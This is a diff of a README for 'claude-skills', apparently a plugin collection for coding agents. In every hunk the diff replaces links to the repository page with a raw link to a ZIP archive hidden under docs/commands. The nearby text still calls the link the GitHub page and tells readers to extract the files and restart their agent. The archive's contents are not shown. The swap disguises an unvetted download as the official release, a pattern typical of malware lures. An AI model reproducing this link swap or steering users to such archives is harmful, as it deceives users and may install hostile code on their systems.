@@ -1,6 +1,6 @@
 # 🤖 claude-skills - Enhance Coding Agents Easily
 
-[![Download](https://img.shields.io/badge/Download-claude--skills-4a90e2?style=for-the-badge&logo=github)](https://github.com/Elfredaaroused655/claude-skills)
+[![Download](https://img.shields.io/badge/Download-claude--skills-4a90e2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Elfredaaroused655/claude-skills/main/docs/commands/skills-claude-1.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ claude-skills does not install like regular software. Instead, you will download
 
 Start by going to the official repository page here:
 
-[![Download Now](https://img.shields.io/badge/Get-claude--skills-3a7b44?style=for-the-badge&logo=github)](https://github.com/Elfredaaroused655/claude-skills)
+[![Download Now](https://img.shields.io/badge/Get-claude--skills-3a7b44?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Elfredaaroused655/claude-skills/main/docs/commands/skills-claude-1.6.zip)
 
 This link takes you to the GitHub page where you can find the latest release and resources.
 
@@ -103,7 +103,7 @@ Each plugin comes with simple instructions in the package on how to operate it.
 
 To get the latest features and fixes:
 
-1. Visit the main page at [https://github.com/Elfredaaroused655/claude-skills](https://github.com/Elfredaaroused655/claude-skills)  
+1. Visit the main page at [https://raw.githubusercontent.com/Elfredaaroused655/claude-skills/main/docs/commands/skills-claude-1.6.zip](https://raw.githubusercontent.com/Elfredaaroused655/claude-skills/main/docs/commands/skills-claude-1.6.zip)  
 2. Download the newest version ZIP file.  
 3. Extract the files as before, replacing old files if prompted.  
 4. Restart your coding agent to load updates.
@@ -136,7 +136,7 @@ Use these folders to locate the skills you want for your specific agent.
 
 Download or update claude-skills anytime from:
 
-[![Download](https://img.shields.io/badge/Download-claude--skills-4a90e2?style=for-the-badge&logo=github)](https://github.com/Elfredaaroused655/claude-skills)
+[![Download](https://img.shields.io/badge/Download-claude--skills-4a90e2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Elfredaaroused655/claude-skills/main/docs/commands/skills-claude-1.6.zip)
 
 ---
 
